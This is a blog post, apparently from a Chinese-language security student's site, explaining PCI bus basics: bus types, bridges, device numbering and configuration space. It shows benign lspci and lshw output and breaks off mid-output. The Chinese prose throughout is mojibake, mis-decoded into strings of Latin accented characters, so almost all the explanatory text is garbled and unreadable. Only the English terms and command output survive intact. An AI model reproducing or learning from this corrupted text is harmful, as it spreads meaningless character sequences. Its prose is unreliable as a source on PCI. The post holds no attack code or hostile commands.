    <content type="html"><![CDATA[<p>ğŸ‘´ç­‰ä¼šæŠŠä½ æ€»çº¿éƒ½ç»™æ‰¬äº†</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>å› ä¸ºç¬”è€…æœ€è¿‘ä¸æ‡‚ä¸ºä»€ä¹ˆå¼€å§‹å†™ PCI è®¾å¤‡é©±åŠ¨äº†ï¼Œä½†ç¬”è€…æ˜¯ <em>ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸š</em> çš„æœ¬ç§‘ç”Ÿï¼Œæ­¤å‰åŸºæœ¬ä¸Šæ²¡æœ‰æ¥è§¦è¿‡ä¸ç¡¬ä»¶ç›¸å…³è”çš„çŸ¥è¯†ï¼ˆ<del>å› ä¸ºè®¡ç»„å’Œå¾®åŸè¯¾è®²çš„å°±æ˜¯ä¸ªğŸ“â‘§</del>ï¼‰ï¼Œæ‰€ä»¥å¼€äº†è¿™ç¯‡æ–°çš„åšå®¢ç®€è¦è®°è½½ä¸€äº›ä¸ PCI è®¾å¤‡ç›¸å…³çš„åŸºç¡€çŸ¥è¯†ã€åŸºæœ¬ Linux PCI é©±åŠ¨çš„ç¼–å†™ç­‰</p><blockquote><p>ä¸ºäº†å†™è¿™ç¯‡åšå®¢ï¼Œç¬”è€…ç¿»äº†ç¬”è€…å¤§äºŒä¸Šå­¦æœŸçš„è®¡ç®—æœºç»„æˆåŸç†çš„è¯¾æœ¬ï¼Œè¿˜ç¿»äº†å¤§äºŒä¸‹å­¦æœŸçš„å¾®æœºåŸç†çš„è¯¾æœ¬ï¼Œå‘ç°<strong>è¿™ä¸¤é—¨è¯¾æ ¹æœ¬å°±æ˜¯ä»€ä¹ˆéƒ½æ²¡è®²â€¦â€¦<strong>å› ä¸ºä¹Ÿå¼„ä¸åˆ°å¾®é™¢é‚£è¾¹ç›¸å…³çš„æ•™æï¼Œæ‰€ä»¥æœ¬ç¯‡åšå®¢</strong>å¹¶æ²¡æœ‰ä¸€ä¸ªç³»ç»Ÿæ€§çš„æŒ‡å¯¼</strong>æ¥è¾…åŠ©å†™ä½œï¼Œéƒ½æ˜¯å„ç§ä¸œæ‹¼è¥¿å‡‘ï¼‹ç¬”è€…è‡ªå·±çš„ç†è§£ï¼Œ<strong>å¾ˆå¤šä¸œè¥¿å› ä¸ºç¬”è€…è‡ªèº«æ°´å¹³ä½ä¸‹çš„ç¼˜æ•…åªèƒ½ä¸€ç¬”å¸¦è¿‡</strong>ï¼Œå› æ­¤å¯èƒ½ä¼šæ˜¾å¾—ä¸å¤Ÿä¸“ä¸šï¼Œå¸Œæœ›è¯»è€…è§è°…XD</p><blockquote><p>å¦‚æœéœ€è¦æ›´ä¸ºä¸“ä¸šçš„å‚è€ƒèµ„æ–™è¯·ç›´æ¥å‚è€ƒ <a href="https://www.mindshare.com/Books/Titles/PCI_Express_Technology_3.0">ã€ŠPCI_Express_Technologyã€‹</a></p></blockquote><blockquote><p>ä»¥åŠç¬”è€…éå¸¸æ·±åˆ»çš„æ„è¯†åˆ°åœ¨ç¡¬ä»¶è¿™ä¸€å—çš„çŸ¥è¯†ç¬”è€…ç›¸æ¯”äºé‚£äº›ä¸“é—¨æç¡¬ä»¶çš„äººè€Œè¨€**ç¡®å®å·®äº†å¾ˆå¤šâ€¦..**åªèƒ½è¯´ç»§ç»­åŠªåŠ›å§XD</p></blockquote></blockquote><h1 id="0x01-PCI-basic-knowledge"><a href="#0x01-PCI-basic-knowledge" class="headerlink" title="0x01. PCI basic knowledge"></a>0x01. PCI basic knowledge</h1><h2 id="ä¸€ã€æ€»çº¿ç»“æ„ç®€è¿°"><a href="#ä¸€ã€æ€»çº¿ç»“æ„ç®€è¿°" class="headerlink" title="ä¸€ã€æ€»çº¿ç»“æ„ç®€è¿°"></a>ä¸€ã€æ€»çº¿ç»“æ„ç®€è¿°</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“è®¡ç®—æœºçš„äº”ä¸ªåŸºæœ¬ç»„ä»¶ä¸ºï¼š<strong>è¾“å…¥ï¼Œè¾“å‡ºï¼Œå­˜å‚¨å™¨ï¼Œè¿ç®—å™¨ï¼ˆæˆ–æ•°æ®é€šè·¯ï¼‰ï¼Œæ§åˆ¶å™¨</strong>ã€‚é‚£ä¹ˆè¿™å‡ å¤§ç»„ä»¶ä¹‹é—´æ€ä¹ˆé€šä¿¡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¾é <strong>ç³»ç»Ÿæ€»çº¿</strong></p><p><strong>æ€»çº¿</strong>ï¼ˆbusï¼‰æ˜¯ä¸€ç§å°†å¤šä¸ªåŠŸèƒ½å•å…ƒè¿›è¡Œè¿æ¥å¹¶å…è®¸åŠŸèƒ½å•å…ƒä¹‹é—´è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ç§æ•°æ®é€šè·¯ï¼Œåœ¨ç°ä»£è®¡ç®—æœºä¸­é€šå¸¸é‡‡ç”¨æ€»çº¿ç»“æ„ï¼Œå³å­˜åœ¨ä¸€æ ¹ä¸»è¦çš„å…¬å…±é€šä¿¡å¹²çº¿ï¼ŒCPU åŠå„ç§è®¾å¤‡éƒ½é€šè¿‡è¿™è·Ÿæ€»çº¿è¿›è¡Œé€šä¿¡</p><p>æ€»çº¿æŒ‰åŠŸèƒ½å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</p><ul><li><strong>ç‰‡å†…æ€»çº¿</strong>ï¼šèŠ¯ç‰‡å†…çš„æ€»çº¿ï¼Œä½äº CPU å†…éƒ¨ï¼Œç”¨ä»¥åœ¨å¯„å­˜å™¨ä¸å¯„å­˜å™¨ã€å¯„å­˜å™¨ä¸ ALU ä¹‹é—´è¿›è¡Œæ•°æ®äº¤æ¢</li><li><strong>ç³»ç»Ÿæ€»çº¿</strong>ï¼šè®¡ç®—æœºç³»ç»Ÿå†…å„åŠŸèƒ½å•å…ƒï¼ˆCPUã€ä¸»å­˜ã€I&#x2F;Oï¼‰ä¹‹é—´çš„å…¬å…±é€šä¿¡å¹²çº¿ï¼Œä¹Ÿç§°ä¹‹ä¸º <em>å†…æ€»çº¿</em></li><li><strong>é€šä¿¡æ€»çº¿</strong>ï¼šç”¨äºè®¡ç®—æœºç³»ç»Ÿä¹‹é—´æˆ–æ˜¯è®¡ç®—æœºç³»ç»Ÿä¸å…¶ä»–ç³»ç»Ÿï¼ˆä¾‹å¦‚è¿œç¨‹é€šä¿¡è®¾å¤‡ï¼‰ä¹‹é—´è¿›è¡Œé€šä¿¡çš„æ€»çº¿ï¼Œä¹Ÿç§°ä¹‹ä¸º <em>å¤–æ€»çº¿</em></li></ul><p>æ€»çº¿æ˜¯å¯ä»¥æ‰©å±•çš„ï¼Œå³å¯ä»¥å­˜åœ¨å¤šä¸ªä¸åŒç±»å‹çš„æ€»çº¿ç›¸è¿ï¼Œä¸åŒçš„è®¾å¤‡æ¥å…¥åˆ°ä¸åŒç±»å‹çš„æ€»çº¿ä¸Š</p><p><img src="https://s2.loli.net/2022/07/21/fWTEztvhuXAqN8d.png" alt="image.png"></p><h2 id="äºŒã€PCI-æ¦‚å¿µç®€è¿°"><a href="#äºŒã€PCI-æ¦‚å¿µç®€è¿°" class="headerlink" title="äºŒã€PCI æ¦‚å¿µç®€è¿°"></a>äºŒã€PCI æ¦‚å¿µç®€è¿°</h2><p>PCI å³ <code>Peripheral Component Interconnect</code>ï¼Œæ˜¯ä¸€ç§<strong>è¿æ¥ç”µè„‘ä¸»æ¿å’Œå¤–éƒ¨è®¾å¤‡çš„æ€»çº¿æ ‡å‡†</strong>ï¼Œå…¶é€šè¿‡å¤šæ ¹ PCI bus å®Œæˆ CPU ä¸ å¤šä¸ª PCI è®¾å¤‡é—´çš„è¿æ¥ï¼Œï¼Œåœ¨ X86 ç¡¬ä»¶ä½“ç³»ç»“æ„ä¸­å‡ ä¹æ‰€æœ‰çš„è®¾å¤‡éƒ½ä»¥å„ç§å½¢å¼è¿æ¥åˆ° PCI è®¾å¤‡æ ‘ä¸Š</p><p><code>PCI express</code> æ˜¯æ–°ä¸€ä»£çš„æ€»çº¿æ ‡å‡†ï¼Œå®ƒæ²¿ç”¨æ—¢æœ‰çš„PCIç¼–ç¨‹æ¦‚å¿µåŠä¿¡å·æ ‡å‡†ï¼Œå¹¶ä¸”æ„å»ºäº†æ›´åŠ é«˜é€Ÿçš„ä¸²è¡Œé€šä¿¡ç³»ç»Ÿæ ‡å‡†</p><p>æˆ‘ä»¬é¦–å…ˆæ˜ç¡® PCI æ ‡å‡†ä¸­çš„ä¸‰ä¸ªåŸºæœ¬ç»„ä»¶ï¼š</p><ul><li><strong>PCI è®¾å¤‡</strong>ï¼ˆdeviceï¼‰ï¼šç¬¦åˆ PCI æ€»çº¿æ ‡å‡†çš„è®¾å¤‡éƒ½å¯ä»¥ç§°ä¹‹ä¸º PCI è®¾å¤‡ï¼Œåœ¨ä¸€ä¸ª PCI æ€»çº¿ä¸Šå¯ä»¥åŒ…å«å¤šä¸ª PCI è®¾å¤‡</li><li><strong>PCI æ€»çº¿</strong>ï¼ˆbusï¼‰ï¼šç”¨ä»¥è¿æ¥å¤šä¸ª PCI è®¾å¤‡ä¸å¤šä¸ª PCI æ¡¥çš„é€šä¿¡å¹²é“</li><li><strong>PCI æ¡¥</strong>ï¼ˆbridgeï¼‰ï¼šæ€»çº¿ä¹‹é—´çš„<strong>è¿æ¥æ¢çº½</strong>ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š<ul><li>HOST&#x2F;PCI æ¡¥ï¼šä¹Ÿç§°ä¸º PCI ä¸»æ¡¥æˆ–è€… PCI æ€»çº¿æ§åˆ¶å™¨ï¼Œç”¨ä»¥è¿æ¥ CPU ä¸ PCI æ ¹æ€»çº¿ï¼Œ<strong>éš”ç¦»è®¾å¤‡åœ°å€ç©ºé—´ä¸å­˜å‚¨å™¨åœ°å€ç©ºé—´</strong>ï¼Œç°ä»£ PC é€šå¸¸è¿˜ä¼šåœ¨å…¶ä¸­é›†æˆå†…å­˜æ§åˆ¶å™¨ï¼Œç§°ä¹‹ä¸º<strong>åŒ—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆNorth Bridge Chipsetï¼‰</li><li>PCI&#x2F;ISA æ¡¥ï¼šç”¨äºè¿æ¥æ—§çš„ ISA æ€»çº¿ï¼Œé€šå¸¸è¿˜ä¼šé›†æˆä¸­æ–­æ§åˆ¶å™¨ï¼ˆå¦‚ i8359Aï¼‰ï¼Œç§°ä¹‹ä¸º<strong>å—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆSouth Bridge Chipsetï¼‰</li><li>PCI-to-PCI æ¡¥ï¼šç”¨äºè¿æ¥ PCI ä¸»æ€»çº¿ï¼ˆPrimary Busï¼‰ä¸æ¬¡æ€»çº¿ï¼ˆSecondary Busï¼‰</li></ul></li></ul><p>PCIé‡‡ç”¨æ ‘å½¢æ‹“æ‰‘ç»“æ„ï¼Œä¸€ä¸ªå…¸å‹çš„ PCI æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç”±ä¸€ä¸ª <code>PCI Host Bus</code> è´Ÿè´£æ€»çš„é€šä¿¡ï¼Œ åœ¨ Host Bus ä¸‹æŒ‚è½½ç€ä¸€ä¸ªæˆ–å¤šä¸ª <code>PCI Root Bridge</code>ï¼Œä¸€ä¸ª <code>PCI Root Bridge</code> ç®¡ç†ä¸€ä¸ª <code>PCI Local Bus</code> ç©ºé—´ï¼ŒæŒ‚è½½ç€ä¸€é¢— PCI æ€»çº¿æ ‘ï¼š</p><p><img src="https://s2.loli.net/2022/08/30/LI1ayCdsB2qNWb4.png" alt="image.png"></p><p>ç”±æ­¤ï¼Œä¸€ä¸ªå¤šå±‚ PCI æ€»çº¿ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/7rT3aEytb2lumZP.png" alt="image.png"></p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªç°å®ä¸­çš„ç»å…¸ä¾‹å­ï¼Œä»¥ä¸‹å›¾çš„ <code>Intel 440FX</code> èŠ¯ç‰‡ç»„ä¸ºä¾‹ï¼ŒPCI Host Bridge åˆ†éš”å¼€äº†å­˜å‚¨å™¨åŸŸä¸ PCI è®¾å¤‡åŸŸï¼Œ<strong>å…¶åˆ†åˆ«ä½¿ç”¨ç‹¬ç«‹çš„åœ°å€ç©ºé—´</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>åœ¨ Linux ä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>lspci</code> æŒ‡ä»¤æŸ¥çœ‹æ’åœ¨å½“å‰æœºå™¨çš„ PCI bus ä¸Šçš„ PCI è®¾å¤‡ï¼Œä½¿ç”¨ <code>-t</code> å‚æ•°æŸ¥çœ‹æ ‘å½¢ç»“æ„ï¼Œ<code>-v</code> å‚æ•°å¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼š</p><blockquote><p>è¿™é‡Œå±•ç¤ºçš„ç»“æœæœ‰ virtio è®¾å¤‡æ˜¯å› ä¸ºç¬”è€…æ˜¯åœ¨é˜¿é‡Œäº‘å­¦ç”Ÿæœºä¸Šä½¿ç”¨çš„å‘½ä»¤ï¼Œè¿™ç±»æœºå™¨ä¸€èˆ¬å…¶å®éƒ½æ˜¯ç”¨ Qemu è·‘çš„è™šæ‹Ÿæœº</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci</span><br>00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)<br>00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01)<br>00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)<br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00:03.0 Ethernet controller: Red Hat, Inc. Virtio network device<br>00:04.0 Communication controller: Red Hat, Inc. Virtio console<br>00:05.0 SCSI storage controller: Red Hat, Inc. Virtio block device<br>00:06.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -t -v</span><br>-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]<br>           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>           +-01.2  Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II]<br>           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI<br>           +-02.0  Cirrus Logic GD 5446<br>           +-03.0  Red Hat, Inc. Virtio network device<br>           +-04.0  Red Hat, Inc. Virtio console<br>           +-05.0  Red Hat, Inc. Virtio block device<br>           \-06.0  Red Hat, Inc. Virtio memory balloon<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ <code>lshw -businfo</code> å‘½ä»¤æ¥è·å–è®¾å¤‡ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo lshw -businfo</span><br>[sudo] password for arttnba3:<br>Bus info          Device       Class          Description<br>=========================================================<br>                               system         Alibaba Cloud ECS<br>                               bus            Motherboard<br>                               memory         96KiB BIOS<br>cpu@0                          processor      Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz<br>                               memory         2GiB System Memory<br>                               memory         2GiB DIMM RAM<br>pci@0000:00:00.0               bridge         440FX - 82441FX PMC [Natoma]<br>pci@0000:00:01.0               bridge         82371SB PIIX3 ISA [Natoma/Triton II]<br>pci@0000:00:01.1               storage        82371SB PIIX3 IDE [Natoma/Triton II]<br>pci@0000:00:01.2               bus            82371SB PIIX3 USB [Natoma/Triton II]<br>usb@1             usb1         bus            UHCI Host Controller<br>usb@1:1                        input          QEMU USB Tablet<br>pci@0000:00:01.3               bridge         82371AB/EB/MB PIIX4 ACPI<br>pci@0000:00:02.0               display        GD 5446<br>pci@0000:00:03.0               network        Virtio network device<br>virtio@0          eth0         network        Ethernet interface<br>pci@0000:00:04.0               communication  Virtio console<br>virtio@1                       generic        Virtual I/O device<br>pci@0000:00:05.0               storage        Virtio block device<br>virtio@2          /dev/vda     disk           42GB Virtual I/O device<br>virtio@2,1        /dev/vda1    volume         39GiB EXT4 volume<br>pci@0000:00:06.0               generic        Virtio memory balloon<br>virtio@3                       generic        Virtual I/O device<br>                               system         PnP device PNP0b00<br>                               input          PnP device PNP0303<br>                               input          PnP device PNP0f13<br>                               storage        PnP device PNP0700<br>                               communication  PnP device PNP0501<br>                  veth073b1a5  network        Ethernet interface<br>                  veth2c8670f  network        Ethernet interface<br>                  vethc0202a2  network        Ethernet interface<br>                  veth49e878e  network        Ethernet interface<br></code></pre></td></tr></table></figure><p>PCI è®¾å¤‡æ˜¯åœ¨å†…æ ¸å¯åŠ¨åˆå§‹åŒ–é˜¶æ®µè¿›è¡Œæšä¸¾çš„ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½æœ‰çš„è®¾å¤‡è¿˜æ²¡å‡†å¤‡å¥½ï¼Œä»è€Œæ²¡è¢«æšä¸¾åˆ°ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é‡æ–°è¿›è¡Œè®¾å¤‡æšä¸¾ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /sys/bus/pci/rescan</span><br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€PCI-è®¾å¤‡ç¼–å·"><a href="#ä¸‰ã€PCI-è®¾å¤‡ç¼–å·" class="headerlink" title="ä¸‰ã€PCI è®¾å¤‡ç¼–å·"></a>ä¸‰ã€PCI è®¾å¤‡ç¼–å·</h2><p>æ¯ä¸ªPCI è®¾å¤‡éƒ½æœ‰ç€ä¸‰ä¸ªç¼–å·ï¼š<strong>æ€»çº¿ç¼–å·ï¼ˆBus Numberï¼‰ã€è®¾å¤‡ç¼–å·ï¼ˆDevice Numberï¼‰ä¸åŠŸèƒ½ç¼–å·ï¼ˆFunction Numberï¼‰</strong>ï¼Œä½œä¸ºè®¾å¤‡çš„å”¯ä¸€æ ‡è¯†ï¼›åœ¨æ­¤ä¹‹ä¸Šè¿˜æœ‰ <strong>PCI åŸŸ</strong>çš„æ¦‚å¿µï¼Œä¸€ä¸ª PCI åŸŸä¸Šæœ€å¤šå¯ä»¥è¿æ¥ 256 æ ¹ PCI æ€»çº¿</p><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>lspci</code> å‘½ä»¤æŸ¥çœ‹ PCI è®¾å¤‡ä¿¡æ¯æ—¶ï¼Œåœ¨æ¯ä¸ªè®¾å¤‡å¼€å¤´éƒ½å¯ä»¥çœ‹åˆ°å½¢å¦‚ <code>xx:yy.z</code> çš„åå…­è¿›åˆ¶ç¼–å·ï¼Œè¿™ä¸ªæ ¼å¼å…¶å®æ˜¯ <code>æ€»çº¿ç¼–å·:è®¾å¤‡ç¼–å·.åŠŸèƒ½ç¼–å·</code>ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ <code>lspci -v </code>æŸ¥çœ‹ PCI è®¾å¤‡ä¿¡æ¯æ—¶ï¼Œåœ¨æ€»çº¿ç¼–å·å‰é¢çš„ 4 ä½æ•°å­—ä¾¿æ˜¯ PCI åŸŸçš„ç¼–å·</p><h2 id="å››ã€PCI-è®¾å¤‡é…ç½®ç©ºé—´"><a href="#å››ã€PCI-è®¾å¤‡é…ç½®ç©ºé—´" class="headerlink" title="å››ã€PCI è®¾å¤‡é…ç½®ç©ºé—´"></a>å››ã€PCI è®¾å¤‡é…ç½®ç©ºé—´</h2><p>æ¯ä¸ª PCI é€»è¾‘è®¾å¤‡ä¸­éƒ½æœ‰ç€å…¶è‡ªå·±çš„<strong>é…ç½®ç©ºé—´</strong>ï¼ˆconfiguration spaceï¼‰ï¼Œé€šå¸¸æ˜¯è®¾å¤‡åœ°å€ç©ºé—´çš„å‰ 64 å­—èŠ‚ï¼ˆæ–°ç‰ˆçš„è®¾å¤‡è¿˜æ‰©å±•äº† 0x40~0xFF è¿™æ®µé…ç½®ç©ºé—´ï¼‰ï¼Œå…¶ä¸­å­˜æ”¾äº†ä¸€äº›è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚ç”Ÿå‚å•†ä¿¡æ¯ã€IRQä¸­æ–­å·ã€mem ç©ºé—´ä¸ io ç©ºé—´çš„èµ·å§‹åœ°å€ä¸å¤§å°ç­‰</p><p>Intel èŠ¯ç‰‡ç»„ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ IO ç©ºé—´çš„ <code>CF8/CFC</code> åœ°å€ï¼ˆç«¯å£ï¼‰æ¥è®¿é—® PCI è®¾å¤‡çš„é…ç½®å¯„å­˜å™¨ï¼š</p><ul><li><code>CF8</code>ï¼š<strong>CONFIG_ADDRESS</strong>ï¼Œå³ PCI é…ç½®ç©ºé—´åœ°å€ç«¯å£ã€‚</li><li><code>CFH</code>ï¼š<strong>CONFIG_DATA</strong>ï¼Œå³ PCI é…ç½®ç©ºé—´æ•°æ®ç«¯å£ã€‚</li></ul><p>å½“æˆ‘ä»¬å¾€ <code>CONFIG_ADDRESS</code> ç«¯å£å¡«å…¥å¯¹åº”çš„è®¾å¤‡æ ‡è¯†åï¼Œå°±å¯ä»¥ä» <code>CONFIG_DATA</code> ç«¯å£ä¸Šè¯»å†™ PCI é…ç½®ç©ºé—´çš„å†…å­˜ï¼Œ <code>CONFIG_ADDRESS</code> ç«¯å£çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><ul><li><code>31</code> ä½ï¼šEnable ä½</li><li><code>23:16</code> ä½ï¼šæ€»çº¿ç¼–å·</li><li><code>15:11</code> ä½ï¼šè®¾å¤‡ç¼–å·</li><li><code>10:8</code> ä½ï¼šåŠŸèƒ½ç¼–å·</li><li><code>7:2</code> ä½ï¼šé…ç½®ç©ºé—´å¯„å­˜å™¨ç¼–å·</li><li><code>1:0</code> ä½ï¼šæ’ä¸º <code>00</code></li></ul><blockquote><p>é™¤äº†é€šè¿‡ç«¯å£è®¿é—®å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ MMIO çš„æ–¹å¼è®¿é—®ä¸€ä¸ª PCI è®¾å¤‡çš„åœ°å€ç©ºé—´</p></blockquote><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ PCI é…ç½®ç©ºé—´çš„ç»“æ„ï¼ŒPCI è®¾å¤‡åˆ†ä¸º <code>Bridge</code> ä¸ <code>Agent</code> ä¸¤ç±»ï¼Œæ•…é…ç½®ç©ºé—´ä¹Ÿåˆ†ä¸ºç›¸åº”çš„ä¸¤ç±»</p><p>Agent ç±»å‹é…ç½®ç©ºé—´åˆè¢«ç§°ä¸º <code>Type 00h</code>ï¼Œæ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/CEpqkAM1D78XRLG.png" alt="image.png"></p><p>ç›¸åº”åœ°ï¼ŒBridge ç±»å‹é…ç½®ç©ºé—´è¢«ç§°ä¸º <code>Type 01h</code>ï¼Œä¸ Agent ç±»å‹é…ç½®ç©ºé—´å¤§åŒå°å¼‚ï¼š</p><p><img src="https://s2.loli.net/2022/07/21/emyrRVo5W6X12aG.png" alt="image.png"></p><p>ç®€å•ä»‹ç»å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µï¼š</p><ul><li><p>è®¾å¤‡æ ‡è¯†ç›¸å…³ï¼š</p><ul><li><p><code>Vendor ID</code>ï¼šç”Ÿäº§å‚å•†çš„ IDï¼Œä¾‹å¦‚ Intel è®¾å¤‡é€šå¸¸ä¸º <code>0x8086</code></p></li><li><p><code>Device ID</code>ï¼šå…·ä½“è®¾å¤‡çš„ IDï¼Œé€šå¸¸ä¹Ÿæ˜¯ç”±å‚å®¶è‡ªè¡ŒæŒ‡å®šçš„</p></li><li><p><code>Class Code</code>ï¼šç±»ä»£ç ï¼Œç”¨äºåŒºåˆ†è®¾å¤‡ç±»å‹</p></li><li><p><code>Revision ID</code>ï¼šPCI è®¾å¤‡çš„ç‰ˆæœ¬å·ï¼Œå¯ä»¥çœ‹ä½œ Device ID çš„æ‰©å±•</p></li></ul></li><li><p>è®¾å¤‡çŠ¶æ€ç›¸å…³ï¼š</p><ul><li><p><code>Status</code>ï¼šè®¾å¤‡çš„çŠ¶æ€å­—å¯„å­˜å™¨ï¼Œå„ bit å«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/ZTplAr87OQ96cRU.png" alt="image.png"></p></li><li><p><code>Command</code>ï¼šè®¾å¤‡çš„çŠ¶æ€å­—å¯„å­˜å™¨ï¼Œå„ bit å«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/rM3YhuaoPK25mNn.png" alt="image.png"></p></li></ul></li><li><p>è®¾å¤‡é…ç½®ç›¸å…³ï¼š</p><ul><li><p><code>Base Address Registers</code>ï¼šå†³å®šäº† PCI è®¾å¤‡ç©ºé—´æ˜ å°„åˆ°ç³»ç»Ÿç©ºé—´çš„å…·ä½“ä½ç½®ï¼Œæœ‰ä¸¤ç§æ˜ å°„æ–¹å¼ï¼šMMIO ä¸ PMIOï¼Œæ˜ å°„æ–¹å¼ç”±æœ€ä½ä½å†³å®šï¼Œä¸å¯æ›´æ”¹</p></li><li><p><code>Interrupt Pin</code>ï¼šä¸­æ–­å¼•è„šï¼Œè¯¥å¯„å­˜å™¨è¡¨ç¤ºè®¾å¤‡æ‰€è¿æ¥çš„å¼•è„š</p></li><li><p><code>Interrupt Line</code>ï¼šä¸­æ–­ç¼–å·</p></li></ul></li></ul><p>å‰é¢æˆ‘ä»¬è®²åˆ° lspci å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>-s</code> æ¥é€šè¿‡æŒ‡å®šæŸ¥çœ‹çš„å…·ä½“ PCI è®¾å¤‡ï¼Œé€šè¿‡ <code>-m</code> æŸ¥çœ‹éƒ¨åˆ†ä¿¡æ¯ï¼Œé€šè¿‡ <code>-nn</code> æŸ¥çœ‹æ¯”è¾ƒè¯¦ç»†çš„ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -m</span><br>Device: 00:02.0<br>Class:  VGA compatible controller<br>Vendor: Cirrus Logic<br>Device: GD 5446<br>SVendor:        Red Hat, Inc.<br>SDevice:        QEMU Virtual Machine<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -nn</span><br>00:02.0 VGA compatible controller [0300]: Cirrus Logic 